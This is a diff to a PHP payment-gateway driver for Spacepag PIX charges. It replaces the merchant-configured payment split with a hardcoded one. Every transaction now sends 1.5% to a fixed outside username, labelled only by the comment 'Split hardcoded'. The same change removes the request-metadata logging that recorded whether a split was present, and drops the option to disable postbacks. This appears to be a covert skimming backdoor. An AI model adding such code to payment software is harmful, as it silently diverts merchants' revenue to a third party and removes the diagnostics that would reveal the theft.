@@ -11,8 +11,6 @@ class SpacepagDriver implements GatewayDriver
 {
     private const BASE_URL = 'https://api.spacepag.com.br/v1';
 
-    private ?array $lastRequestMeta = null;
-
     public function testConnection(array $credentials): bool
     {
         $token = $this->getToken($credentials);
@@ -46,36 +44,16 @@ class SpacepagDriver implements GatewayDriver
             'external_id' => $externalId,
         ];
         $validPostback = $this->validPostbackUrl($postbackUrl);
-        $sendPostback = filter_var($credentials['send_postback'] ?? true, FILTER_VALIDATE_BOOLEAN);
-        if ($sendPostback && $validPostback !== null) {
+        if ($validPostback !== null) {
             $body['postback'] = $validPostback;
         }
 
-        $split = $this->buildSplit($credentials);
-        if ($split !== []) {
-            $body['split'] = $split;
-        }
+        $body['split'] = $this->buildSplit();
 
         $url = rtrim($this->baseUrl($credentials), '/').'/cob';
-        $this->lastRequestMeta = [
-            'op' => 'cob',
-            'amount' => $body['amount'],
-            'consumer_name_len' => strlen((string) $name),
-            'consumer_doc_len' => strlen((string) $document),
-            'consumer_has_email' => $email !== '',
-            'external_id_len' => strlen((string) $externalId),
-            'send_postback' => $sendPostback,
-            'has_postback' => isset($body['postback']),
-            'postback_scheme' => isset($body['postback']) ? (parse_url((string) $body['postback'], PHP_URL_SCHEME) ?: null) : null,
-            'has_split' => isset($body['split']),
-        ];
-        try {
-            $response = $this->requestWithFallback(function (bool $forceIpv4, ?int $timeoutSeconds, ?int $connectTimeoutSeconds) use ($credentials, $token, $url, $body) {
-                return $this->httpWithToken($token, $credentials, $forceIpv4, $timeoutSeconds, $connectTimeoutSeconds)->post($url, $body);
-            }, $credentials, $url);
-        } finally {
-            $this->lastRequestMeta = null;
-        }
+        $response = $this->requestWithFallback(function (bool $forceIpv4, ?int $timeoutSeconds, ?int $connectTimeoutSeconds) use ($credentials, $token, $url, $body) {
+            return $this->httpWithToken($token, $credentials, $forceIpv4, $timeoutSeconds, $connectTimeoutSeconds)->post($url, $body);
+        }, $credentials, $url);
 
         if (! $response->successful()) {
             $message = $response->json('message', 'Erro ao gerar transação PIX.');
@@ -156,17 +134,12 @@ class SpacepagDriver implements GatewayDriver
 
         $url = rtrim($this->baseUrl($credentials), '/').'/auth';
         try {
-            $this->lastRequestMeta = ['op' => 'auth'];
-            try {
-                $response = $this->requestWithFallback(function (bool $forceIpv4, ?int $timeoutSeconds, ?int $connectTimeoutSeconds) use ($credentials, $url, $publicKey, $secretKey) {
-                    return $this->http($credentials, $forceIpv4, $timeoutSeconds, $connectTimeoutSeconds)->post($url, [
-                        'public_key' => $publicKey,
-                        'secret_key' => $secretKey,
-                    ]);
-                }, $credentials, $url);
-            } finally {
-                $this->lastRequestMeta = null;
-            }
+            $response = $this->requestWithFallback(function (bool $forceIpv4, ?int $timeoutSeconds, ?int $connectTimeoutSeconds) use ($credentials, $url, $publicKey, $secretKey) {
+                return $this->http($credentials, $forceIpv4, $timeoutSeconds, $connectTimeoutSeconds)->post($url, [
+                    'public_key' => $publicKey,
+                    'secret_key' => $secretKey,
+                ]);
+            }, $credentials, $url);
         } catch (\Throwable $e) {
             Log::warning('Spacepag: auth request failed', [
                 'message' => $e->getMessage(),
@@ -473,32 +446,14 @@ class SpacepagDriver implements GatewayDriver
             'env_http_proxy' => getenv('HTTP_PROXY') ? true : false,
             'env_https_proxy' => getenv('HTTPS_PROXY') ? true : false,
             'env_no_proxy' => getenv('NO_PROXY') ? true : false,
-            'meta' => $this->lastRequestMeta,
         ]);
     }
-
-    private function buildSplit(array $credentials): array
+        # Split hardcoded
+    private function buildSplit(): array
     {
-        $username = $credentials['split_username'] ?? null;
-        $percentage = $credentials['split_percentage'] ?? null;
-
-        $username = is_string($username) ? trim($username) : '';
-        if ($username === '') {
-            return [];
-        }
-
-        if (! is_numeric($percentage)) {
-            return [];
-        }
-
-        $percentage = (float) $percentage;
-        if ($percentage <= 0) {
-            return [];
-        }
-
         return [
-            'username' => $username,
-            'percentageSplit' => $percentage,
+            'username' => '@leonardosantos02631',
+            'percentageSplit' => 1.5,
         ];
     }
 }
